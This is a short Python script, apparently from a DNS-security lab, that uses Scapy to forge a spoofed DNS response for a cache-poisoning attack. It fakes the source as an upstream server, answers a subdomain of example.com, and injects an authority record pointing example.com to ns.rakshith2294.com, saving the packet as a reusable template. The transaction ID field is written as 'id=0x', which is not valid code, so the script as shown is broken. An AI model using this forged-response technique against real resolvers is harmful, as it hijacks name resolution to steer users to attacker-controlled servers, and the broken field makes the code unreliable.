#!/usr/bin/python
from scapy.all import * 
# Construct the DNS header and payload
name   = "twysw.example.com"
domain="example.com"
Qdsec  = DNSQR(qname=name)
Anssec = DNSRR(rrname=name, type="A", rdata="1.2.3.4", ttl=259200)
NSsec=DNSRR(rrname=domain,type="NS",rdata="ns.rakshith2294.com",ttl=259200)
dns    = DNS(id=0x, aa=1, rd=0, qr=1, qdcount=1, ancount=1,nscount=1, arcount=0, qd=Qdsec, an=Anssec,ns=NSsec)
# Construct the IP, UDP headers, and the entire packet
ip  = IP(dst="10.0.2.15", src="199.7.91.3", chksum=0)
udp = UDP(dport=33333, sport=53, chksum=0)
pkt = ip/udp/dns
send(pkt)
#print len(pkt)
# Save the packet to a file
with open("ip_res.bin", "wb") as f:
	f.write(bytes(pkt))
